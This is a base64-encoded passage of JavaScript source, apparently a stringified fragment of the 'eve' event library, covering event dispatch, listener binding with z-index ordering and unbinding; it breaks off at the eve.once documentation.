ICAgICAgICB2YXIgaSA9IHRoaXMubGVuZ3RoO1xuICAgICAgICAgICAgd2hpbGUgKC0taSkge1xuICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgdGhpc1tpXSAhPSBcInVuZGVmaW5lZFwiKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB0aGlzW2ldO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfSxcbiAgICAgICAgb2JqdG9zID0gT2JqZWN0LnByb3RvdHlwZS50b1N0cmluZyxcbiAgICAgICAgU3RyID0gU3RyaW5nLFxuICAgICAgICBpc0FycmF5ID0gQXJyYXkuaXNBcnJheSB8fCBmdW5jdGlvbiAoYXIpIHtcbiAgICAgICAgICAgIHJldHVybiBhciBpbnN0YW5jZW9mIEFycmF5IHx8IG9ianRvcy5jYWxsKGFyKSA9PSBcIltvYmplY3QgQXJyYXldXCI7XG4gICAgICAgIH07XG4gICAgLypcXFxuICAgICAqIGV2ZVxuICAgICBbIG1ldGhvZCBdXG5cbiAgICAgKiBGaXJlcyBldmVudCB3aXRoIGdpdmVuIGBuYW1lYCwgZ2l2ZW4gc2NvcGUgYW5kIG90aGVyIHBhcmFtZXRlcnMuXG5cbiAgICAgPiBBcmd1bWVudHNcblxuICAgICAtIG5hbWUgKHN0cmluZykgbmFtZSBvZiB0aGUgKmV2ZW50KiwgZG90IChgLmApIG9yIHNsYXNoIChgL2ApIHNlcGFyYXRlZFxuICAgICAtIHNjb3BlIChvYmplY3QpIGNvbnRleHQgZm9yIHRoZSBldmVudCBoYW5kbGVyc1xuICAgICAtIHZhcmFyZ3MgKC4uLikgdGhlIHJlc3Qgb2YgYXJndW1lbnRzIHdpbGwgYmUgc2VudCB0byBldmVudCBoYW5kbGVyc1xuXG4gICAgID0gKG9iamVjdCkgYXJyYXkgb2YgcmV0dXJuZWQgdmFsdWVzIGZyb20gdGhlIGxpc3RlbmVycy4gQXJyYXkgaGFzIHR3byBtZXRob2RzIGAuZmlyc3REZWZpbmVkKClgIGFuZCBgLmxhc3REZWZpbmVkKClgIHRvIGdldCBmaXJzdCBvciBsYXN0IG5vdCBgdW5kZWZpbmVkYCB2YWx1ZS5cbiAgICBcXCovXG4gICAgICAgIHZhciBldmUgPSBmdW5jdGlvbiAobmFtZSwgc2NvcGUpIHtcbiAgICAgICAgICAgIHZhciBlID0gZXZlbnRzLFxuICAgICAgICAgICAgICAgIG9sZHN0b3AgPSBzdG9wLFxuICAgICAgICAgICAgICAgIGFyZ3MgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMsIDIpLFxuICAgICAgICAgICAgICAgIGxpc3RlbmVycyA9IGV2ZS5saXN0ZW5lcnMobmFtZSksXG4gICAgICAgICAgICAgICAgeiA9IDAsXG4gICAgICAgICAgICAgICAgZiA9IGZhbHNlLFxuICAgICAgICAgICAgICAgIGwsXG4gICAgICAgICAgICAgICAgaW5kZXhlZCA9IFtdLFxuICAgICAgICAgICAgICAgIHF1ZXVlID0ge30sXG4gICAgICAgICAgICAgICAgb3V0ID0gW10sXG4gICAgICAgICAgICAgICAgY2UgPSBjdXJyZW50X2V2ZW50LFxuICAgICAgICAgICAgICAgIGVycm9ycyA9IFtdO1xuICAgICAgICAgICAgb3V0LmZpcnN0RGVmaW5lZCA9IGZpcnN0RGVmaW5lZDtcbiAgICAgICAgICAgIG91dC5sYXN0RGVmaW5lZCA9IGxhc3REZWZpbmVkO1xuICAgICAgICAgICAgY3VycmVudF9ldmVudCA9IG5hbWU7XG4gICAgICAgICAgICBzdG9wID0gMDtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IGxpc3RlbmVycy5sZW5ndGg7IGkgPCBpaTsgaSsrKSBpZiAoXCJ6SW5kZXhcIiBpbiBsaXN0ZW5lcnNbaV0pIHtcbiAgICAgICAgICAgICAgICBpbmRleGVkLnB1c2gobGlzdGVuZXJzW2ldLnpJbmRleCk7XG4gICAgICAgICAgICAgICAgaWYgKGxpc3RlbmVyc1tpXS56SW5kZXggPCAwKSB7XG4gICAgICAgICAgICAgICAgICAgIHF1ZXVlW2xpc3RlbmVyc1tpXS56SW5kZXhdID0gbGlzdGVuZXJzW2ldO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGluZGV4ZWQuc29ydChudW1zb3J0KTtcbiAgICAgICAgICAgIHdoaWxlIChpbmRleGVkW3pdIDwgMCkge1xuICAgICAgICAgICAgICAgIGwgPSBxdWV1ZVtpbmRleGVkW3orK11dO1xuICAgICAgICAgICAgICAgIG91dC5wdXNoKGwuYXBwbHkoc2NvcGUsIGFyZ3MpKTtcbiAgICAgICAgICAgICAgICBpZiAoc3RvcCkge1xuICAgICAgICAgICAgICAgICAgICBzdG9wID0gb2xkc3RvcDtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG91dDtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgIGwgPSBsaXN0ZW5lcnNbaV07XG4gICAgICAgICAgICAgICAgaWYgKFwiekluZGV4XCIgaW4gbCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAobC56SW5kZXggPT0gaW5kZXhlZFt6XSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2gobC5hcHBseShzY29wZSwgYXJncykpO1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0b3ApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIGRvIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB6Kys7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbCA9IHF1ZXVlW2luZGV4ZWRbel1dO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGwgJiYgb3V0LnB1c2gobC5hcHBseShzY29wZSwgYXJncykpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdG9wKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0gd2hpbGUgKGwpXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBxdWV1ZVtsLnpJbmRleF0gPSBsO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2gobC5hcHBseShzY29wZSwgYXJncykpO1xuICAgICAgICAgICAgICAgICAgICBpZiAoc3RvcCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBzdG9wID0gb2xkc3RvcDtcbiAgICAgICAgICAgIGN1cnJlbnRfZXZlbnQgPSBjZTtcbiAgICAgICAgICAgIHJldHVybiBvdXQ7XG4gICAgICAgIH07XG4gICAgICAgIC8vIFVuZG9jdW1lbnRlZC4gRGVidWcgb25seS5cbiAgICAgICAgZXZlLl9ldmVudHMgPSBldmVudHM7XG4gICAgLypcXFxuICAgICAqIGV2ZS5saXN0ZW5lcnNcbiAgICAgWyBtZXRob2QgXVxuXG4gICAgICogSW50ZXJuYWwgbWV0aG9kIHdoaWNoIGdpdmVzIHlvdSBhcnJheSBvZiBhbGwgZXZlbnQgaGFuZGxlcnMgdGhhdCB3aWxsIGJlIHRyaWdnZXJlZCBieSB0aGUgZ2l2ZW4gYG5hbWVgLlxuXG4gICAgID4gQXJndW1lbnRzXG5cbiAgICAgLSBuYW1lIChzdHJpbmcpIG5hbWUgb2YgdGhlIGV2ZW50LCBkb3QgKGAuYCkgb3Igc2xhc2ggKGAvYCkgc2VwYXJhdGVkXG5cbiAgICAgPSAoYXJyYXkpIGFycmF5IG9mIGV2ZW50IGhhbmRsZXJzXG4gICAgXFwqL1xuICAgIGV2ZS5saXN0ZW5lcnMgPSBmdW5jdGlvbiAobmFtZSkge1xuICAgICAgICB2YXIgbmFtZXMgPSBpc0FycmF5KG5hbWUpID8gbmFtZSA6IG5hbWUuc3BsaXQoc2VwYXJhdG9yKSxcbiAgICAgICAgICAgIGUgPSBldmVudHMsXG4gICAgICAgICAgICBpdGVtLFxuICAgICAgICAgICAgaXRlbXMsXG4gICAgICAgICAgICBrLFxuICAgICAgICAgICAgaSxcbiAgICAgICAgICAgIGlpLFxuICAgICAgICAgICAgaixcbiAgICAgICAgICAgIGpqLFxuICAgICAgICAgICAgbmVzLFxuICAgICAgICAgICAgZXMgPSBbZV0sXG4gICAgICAgICAgICBvdXQgPSBbXTtcbiAgICAgICAgZm9yIChpID0gMCwgaWkgPSBuYW1lcy5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICBuZXMgPSBbXTtcbiAgICAgICAgICAgIGZvciAoaiA9IDAsIGpqID0gZXMubGVuZ3RoOyBqIDwgamo7IGorKykge1xuICAgICAgICAgICAgICAgIGUgPSBlc1tqXS5uO1xuICAgICAgICAgICAgICAgIGl0ZW1zID0gW2VbbmFtZXNbaV1dLCBlW3dpbGRjYXJkXV07XG4gICAgICAgICAgICAgICAgayA9IDI7XG4gICAgICAgICAgICAgICAgd2hpbGUgKGstLSkge1xuICAgICAgICAgICAgICAgICAgICBpdGVtID0gaXRlbXNba107XG4gICAgICAgICAgICAgICAgICAgIGlmIChpdGVtKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBuZXMucHVzaChpdGVtKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIG91dCA9IG91dC5jb25jYXQoaXRlbS5mIHx8IFtdKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGVzID0gbmVzO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBvdXQ7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogZXZlLnNlcGFyYXRvclxuICAgICBbIG1ldGhvZCBdXG5cbiAgICAgKiBJZiBmb3Igc29tZSByZWFzb25zIHlvdSBkb27igJl0IGxpa2UgZGVmYXVsdCBzZXBhcmF0b3JzIChgLmAgb3IgYC9gKSB5b3UgY2FuIHNwZWNpZnkgeW91cnNcbiAgICAgKiBoZXJlLiBCZSBhd2FyZSB0aGF0IGlmIHlvdSBwYXNzIGEgc3RyaW5nIGxvbmdlciB0aGFuIG9uZSBjaGFyYWN0ZXIgaXQgd2lsbCBiZSB0cmVhdGVkIGFzXG4gICAgICogYSBsaXN0IG9mIGNoYXJhY3RlcnMuXG5cbiAgICAgLSBzZXBhcmF0b3IgKHN0cmluZykgbmV3IHNlcGFyYXRvci4gRW1wdHkgc3RyaW5nIHJlc2V0cyB0byBkZWZhdWx0OiBgLmAgb3IgYC9gLlxuICAgIFxcKi9cbiAgICBldmUuc2VwYXJhdG9yID0gZnVuY3Rpb24gKHNlcCkge1xuICAgICAgICBpZiAoc2VwKSB7XG4gICAgICAgICAgICBzZXAgPSBTdHIoc2VwKS5yZXBsYWNlKC8oPz1bXFwuXFxeXFxdXFxbXFwtXSkvZywgXCJcXFxcXCIpO1xuICAgICAgICAgICAgc2VwID0gXCJbXCIgKyBzZXAgKyBcIl1cIjtcbiAgICAgICAgICAgIHNlcGFyYXRvciA9IG5ldyBSZWdFeHAoc2VwKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHNlcGFyYXRvciA9IC9bXFwuXFwvXS87XG4gICAgICAgIH1cbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBldmUub25cbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEJpbmRzIGdpdmVuIGV2ZW50IGhhbmRsZXIgd2l0aCBhIGdpdmVuIG5hbWUuIFlvdSBjYW4gdXNlIHdpbGRjYXJkcyDigJxgKmDigJ0gZm9yIHRoZSBuYW1lczpcbiAgICAgfCBldmUub24oXCIqLnVuZGVyLipcIiwgZik7XG4gICAgIHwgZXZlKFwibW91c2UudW5kZXIuZmxvb3JcIik7IC8vIHRyaWdnZXJzIGZcbiAgICAgKiBVc2UgQGV2ZSB0byB0cmlnZ2VyIHRoZSBsaXN0ZW5lci5cbiAgICAgKipcbiAgICAgLSBuYW1lIChzdHJpbmcpIG5hbWUgb2YgdGhlIGV2ZW50LCBkb3QgKGAuYCkgb3Igc2xhc2ggKGAvYCkgc2VwYXJhdGVkLCB3aXRoIG9wdGlvbmFsIHdpbGRjYXJkc1xuICAgICAtIGYgKGZ1bmN0aW9uKSBldmVudCBoYW5kbGVyIGZ1bmN0aW9uXG4gICAgICoqXG4gICAgIC0gbmFtZSAoYXJyYXkpIGlmIHlvdSBkb27igJl0IHdhbnQgdG8gdXNlIHNlcGFyYXRvcnMsIHlvdSBjYW4gdXNlIGFycmF5IG9mIHN0cmluZ3NcbiAgICAgLSBmIChmdW5jdGlvbikgZXZlbnQgaGFuZGxlciBmdW5jdGlvblxuICAgICAqKlxuICAgICA9IChmdW5jdGlvbikgcmV0dXJuZWQgZnVuY3Rpb24gYWNjZXB0cyBhIHNpbmdsZSBudW1lcmljIHBhcmFtZXRlciB0aGF0IHJlcHJlc2VudHMgei1pbmRleCBvZiB0aGUgaGFuZGxlci4gSXQgaXMgYW4gb3B0aW9uYWwgZmVhdHVyZSBhbmQgb25seSB1c2VkIHdoZW4geW91IG5lZWQgdG8gZW5zdXJlIHRoYXQgc29tZSBzdWJzZXQgb2YgaGFuZGxlcnMgd2lsbCBiZSBpbnZva2VkIGluIGEgZ2l2ZW4gb3JkZXIsIGRlc3BpdGUgb2YgdGhlIG9yZGVyIG9mIGFzc2lnbm1lbnQuIFxuICAgICA+IEV4YW1wbGU6XG4gICAgIHwgZXZlLm9uKFwibW91c2VcIiwgZWF0SXQpKDIpO1xuICAgICB8IGV2ZS5vbihcIm1vdXNlXCIsIHNjcmVhbSk7XG4gICAgIHwgZXZlLm9uKFwibW91c2VcIiwgY2F0Y2hJdCkoMSk7XG4gICAgICogVGhpcyB3aWxsIGVuc3VyZSB0aGF0IGBjYXRjaEl0YCBmdW5jdGlvbiB3aWxsIGJlIGNhbGxlZCBiZWZvcmUgYGVhdEl0YC5cbiAgICAgKlxuICAgICAqIElmIHlvdSB3YW50IHRvIHB1dCB5b3VyIGhhbmRsZXIgYmVmb3JlIG5vbi1pbmRleGVkIGhhbmRsZXJzLCBzcGVjaWZ5IGEgbmVnYXRpdmUgdmFsdWUuXG4gICAgICogTm90ZTogSSBhc3N1bWUgbW9zdCBvZiB0aGUgdGltZSB5b3UgZG9u4oCZdCBuZWVkIHRvIHdvcnJ5IGFib3V0IHotaW5kZXgsIGJ1dCBpdOKAmXMgbmljZSB0byBoYXZlIHRoaXMgZmVhdHVyZSDigJxqdXN0IGluIGNhc2XigJ0uXG4gICAgXFwqL1xuICAgIGV2ZS5vbiA9IGZ1bmN0aW9uIChuYW1lLCBmKSB7XG4gICAgICAgIGlmICh0eXBlb2YgZiAhPSBcImZ1bmN0aW9uXCIpIHtcbiAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbiAoKSB7fTtcbiAgICAgICAgfVxuICAgICAgICB2YXIgbmFtZXMgPSBpc0FycmF5KG5hbWUpID8gKGlzQXJyYXkobmFtZVswXSkgPyBuYW1lIDogW25hbWVdKSA6IFN0cihuYW1lKS5zcGxpdChjb21hc2VwYXJhdG9yKTtcbiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gbmFtZXMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgKGZ1bmN0aW9uIChuYW1lKSB7XG4gICAgICAgICAgICAgICAgdmFyIG5hbWVzID0gaXNBcnJheShuYW1lKSA/IG5hbWUgOiBTdHIobmFtZSkuc3BsaXQoc2VwYXJhdG9yKSxcbiAgICAgICAgICAgICAgICAgICAgZSA9IGV2ZW50cyxcbiAgICAgICAgICAgICAgICAgICAgZXhpc3Q7XG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gbmFtZXMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgICAgICBlID0gZS5uO1xuICAgICAgICAgICAgICAgICAgICBlID0gZS5oYXNPd25Qcm9wZXJ0eShuYW1lc1tpXSkgJiYgZVtuYW1lc1tpXV0gfHwgKGVbbmFtZXNbaV1dID0ge246IHt9fSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGUuZiA9IGUuZiB8fCBbXTtcbiAgICAgICAgICAgICAgICBmb3IgKGkgPSAwLCBpaSA9IGUuZi5sZW5ndGg7IGkgPCBpaTsgaSsrKSBpZiAoZS5mW2ldID09IGYpIHtcbiAgICAgICAgICAgICAgICAgICAgZXhpc3QgPSB0cnVlO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgIWV4aXN0ICYmIGUuZi5wdXNoKGYpO1xuICAgICAgICAgICAgfShuYW1lc1tpXSkpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBmdW5jdGlvbiAoekluZGV4KSB7XG4gICAgICAgICAgICBpZiAoK3pJbmRleCA9PSArekluZGV4KSB7XG4gICAgICAgICAgICAgICAgZi56SW5kZXggPSArekluZGV4O1xuICAgICAgICAgICAgfVxuICAgICAgICB9O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIGV2ZS5mXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIGZ1bmN0aW9uIHRoYXQgd2lsbCBmaXJlIGdpdmVuIGV2ZW50IHdpdGggb3B0aW9uYWwgYXJndW1lbnRzLlxuICAgICAqIEFyZ3VtZW50cyB0aGF0IHdpbGwgYmUgcGFzc2VkIHRvIHRoZSByZXN1bHQgZnVuY3Rpb24gd2lsbCBiZSBhbHNvXG4gICAgICogY29uY2F0ZWQgdG8gdGhlIGxpc3Qgb2YgZmluYWwgYXJndW1lbnRzLlxuICAgICB8IGVsLm9uY2xpY2sgPSBldmUuZihcImNsaWNrXCIsIDEsIDIpO1xuICAgICB8IGV2ZS5vbihcImNsaWNrXCIsIGZ1bmN0aW9uIChhLCBiLCBjKSB7XG4gICAgIHwgICAgIGNvbnNvbGUubG9nKGEsIGIsIGMpOyAvLyAxLCAyLCBbZXZlbnQgb2JqZWN0XVxuICAgICB8IH0pO1xuICAgICA+IEFyZ3VtZW50c1xuICAgICAtIGV2ZW50IChzdHJpbmcpIGV2ZW50IG5hbWVcbiAgICAgLSB2YXJhcmdzICjigKYpIGFuZCBhbnkgb3RoZXIgYXJndW1lbnRzXG4gICAgID0gKGZ1bmN0aW9uKSBwb3NzaWJsZSBldmVudCBoYW5kbGVyIGZ1bmN0aW9uXG4gICAgXFwqL1xuICAgIGV2ZS5mID0gZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgIHZhciBhdHRycyA9IFtdLnNsaWNlLmNhbGwoYXJndW1lbnRzLCAxKTtcbiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGV2ZS5hcHBseShudWxsLCBbZXZlbnQsIG51bGxdLmNvbmNhdChhdHRycykuY29uY2F0KFtdLnNsaWNlLmNhbGwoYXJndW1lbnRzLCAwKSkpO1xuICAgICAgICB9O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIGV2ZS5zdG9wXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBJcyB1c2VkIGluc2lkZSBhbiBldmVudCBoYW5kbGVyIHRvIHN0b3AgdGhlIGV2ZW50LCBwcmV2ZW50aW5nIGFueSBzdWJzZXF1ZW50IGxpc3RlbmVycyBmcm9tIGZpcmluZy5cbiAgICBcXCovXG4gICAgZXZlLnN0b3AgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHN0b3AgPSAxO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIGV2ZS5udFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQ291bGQgYmUgdXNlZCBpbnNpZGUgZXZlbnQgaGFuZGxlciB0byBmaWd1cmUgb3V0IGFjdHVhbCBuYW1lIG9mIHRoZSBldmVudC5cbiAgICAgKipcbiAgICAgPiBBcmd1bWVudHNcbiAgICAgKipcbiAgICAgLSBzdWJuYW1lIChzdHJpbmcpICNvcHRpb25hbCBzdWJuYW1lIG9mIHRoZSBldmVudFxuICAgICAqKlxuICAgICA9IChzdHJpbmcpIG5hbWUgb2YgdGhlIGV2ZW50LCBpZiBgc3VibmFtZWAgaXMgbm90IHNwZWNpZmllZFxuICAgICAqIG9yXG4gICAgID0gKGJvb2xlYW4pIGB0cnVlYCwgaWYgY3VycmVudCBldmVudOKAmXMgbmFtZSBjb250YWlucyBgc3VibmFtZWBcbiAgICBcXCovXG4gICAgZXZlLm50ID0gZnVuY3Rpb24gKHN1Ym5hbWUpIHtcbiAgICAgICAgdmFyIGN1ciA9IGlzQXJyYXkoY3VycmVudF9ldmVudCkgPyBjdXJyZW50X2V2ZW50LmpvaW4oXCIuXCIpIDogY3VycmVudF9ldmVudDtcbiAgICAgICAgaWYgKHN1Ym5hbWUpIHtcbiAgICAgICAgICAgIHJldHVybiBuZXcgUmVnRXhwKFwiKD86XFxcXC58XFxcXC98XilcIiArIHN1Ym5hbWUgKyBcIig/OlxcXFwufFxcXFwvfCQpXCIpLnRlc3QoY3VyKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gY3VyO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIGV2ZS5udHNcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIENvdWxkIGJlIHVzZWQgaW5zaWRlIGV2ZW50IGhhbmRsZXIgdG8gZmlndXJlIG91dCBhY3R1YWwgbmFtZSBvZiB0aGUgZXZlbnQuXG4gICAgICoqXG4gICAgICoqXG4gICAgID0gKGFycmF5KSBuYW1lcyBvZiB0aGUgZXZlbnRcbiAgICBcXCovXG4gICAgZXZlLm50cyA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgcmV0dXJuIGlzQXJyYXkoY3VycmVudF9ldmVudCkgPyBjdXJyZW50X2V2ZW50IDogY3VycmVudF9ldmVudC5zcGxpdChzZXBhcmF0b3IpO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIGV2ZS5vZmZcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJlbW92ZXMgZ2l2ZW4gZnVuY3Rpb24gZnJvbSB0aGUgbGlzdCBvZiBldmVudCBsaXN0ZW5lcnMgYXNzaWduZWQgdG8gZ2l2ZW4gbmFtZS5cbiAgICAgKiBJZiBubyBhcmd1bWVudHMgc3BlY2lmaWVkIGFsbCB0aGUgZXZlbnRzIHdpbGwgYmUgY2xlYXJlZC5cbiAgICAgKipcbiAgICAgPiBBcmd1bWVudHNcbiAgICAgKipcbiAgICAgLSBuYW1lIChzdHJpbmcpIG5hbWUgb2YgdGhlIGV2ZW50LCBkb3QgKGAuYCkgb3Igc2xhc2ggKGAvYCkgc2VwYXJhdGVkLCB3aXRoIG9wdGlvbmFsIHdpbGRjYXJkc1xuICAgICAtIGYgKGZ1bmN0aW9uKSBldmVudCBoYW5kbGVyIGZ1bmN0aW9uXG4gICAgXFwqL1xuICAgIC8qXFxcbiAgICAgKiBldmUudW5iaW5kXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBTZWUgQGV2ZS5vZmZcbiAgICBcXCovXG4gICAgZXZlLm9mZiA9IGV2ZS51bmJpbmQgPSBmdW5jdGlvbiAobmFtZSwgZikge1xuICAgICAgICBpZiAoIW5hbWUpIHtcbiAgICAgICAgICAgIGV2ZS5fZXZlbnRzID0gZXZlbnRzID0ge246IHt9fTtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICB2YXIgbmFtZXMgPSBpc0FycmF5KG5hbWUpID8gKGlzQXJyYXkobmFtZVswXSkgPyBuYW1lIDogW25hbWVdKSA6IFN0cihuYW1lKS5zcGxpdChjb21hc2VwYXJhdG9yKTtcbiAgICAgICAgaWYgKG5hbWVzLmxlbmd0aCA+IDEpIHtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IG5hbWVzLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICBldmUub2ZmKG5hbWVzW2ldLCBmKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICBuYW1lcyA9IGlzQXJyYXkobmFtZSkgPyBuYW1lIDogU3RyKG5hbWUpLnNwbGl0KHNlcGFyYXRvcik7XG4gICAgICAgIHZhciBlLFxuICAgICAgICAgICAga2V5LFxuICAgICAgICAgICAgc3BsaWNlLFxuICAgICAgICAgICAgaSwgaWksIGosIGpqLFxuICAgICAgICAgICAgY3VyID0gW2V2ZW50c107XG4gICAgICAgIGZvciAoaSA9IDAsIGlpID0gbmFtZXMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgZm9yIChqID0gMDsgaiA8IGN1ci5sZW5ndGg7IGogKz0gc3BsaWNlLmxlbmd0aCAtIDIpIHtcbiAgICAgICAgICAgICAgICBzcGxpY2UgPSBbaiwgMV07XG4gICAgICAgICAgICAgICAgZSA9IGN1cltqXS5uO1xuICAgICAgICAgICAgICAgIGlmIChuYW1lc1tpXSAhPSB3aWxkY2FyZCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZVtuYW1lc1tpXV0pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNwbGljZS5wdXNoKGVbbmFtZXNbaV1dKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIGZvciAoa2V5IGluIGUpIGlmIChlW2hhc10oa2V5KSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgc3BsaWNlLnB1c2goZVtrZXldKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBjdXIuc3BsaWNlLmFwcGx5KGN1ciwgc3BsaWNlKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICBmb3IgKGkgPSAwLCBpaSA9IGN1ci5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICBlID0gY3VyW2ldO1xuICAgICAgICAgICAgd2hpbGUgKGUubikge1xuICAgICAgICAgICAgICAgIGlmIChmKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChlLmYpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaiA9IDAsIGpqID0gZS5mLmxlbmd0aDsgaiA8IGpqOyBqKyspIGlmIChlLmZbal0gPT0gZikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGUuZi5zcGxpY2UoaiwgMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAhZS5mLmxlbmd0aCAmJiBkZWxldGUgZS5mO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGZvciAoa2V5IGluIGUubikgaWYgKGUubltoYXNdKGtleSkgJiYgZS5uW2tleV0uZikge1xuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGZ1bmNzID0gZS5uW2tleV0uZjtcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaiA9IDAsIGpqID0gZnVuY3MubGVuZ3RoOyBqIDwgamo7IGorKykgaWYgKGZ1bmNzW2pdID09IGYpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jcy5zcGxpY2UoaiwgMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAhZnVuY3MubGVuZ3RoICYmIGRlbGV0ZSBlLm5ba2V5XS5mO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIGUuZjtcbiAgICAgICAgICAgICAgICAgICAgZm9yIChrZXkgaW4gZS5uKSBpZiAoZS5uW2hhc10oa2V5KSAmJiBlLm5ba2V5XS5mKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBkZWxldGUgZS5uW2tleV0uZjtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBlID0gZS5uO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogZXZlLm9uY2VcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEJpbmRzIGdpdmVuIGV2ZW50IGhhbmRsZXIgd2l0aCBhIGdpdmVuIG5hbWUgdG8gb25seSBydW4gb25jZSB0aGVuIHVuYmluZCBpdHNlbGYuXG4gICAgIHwgZXZlL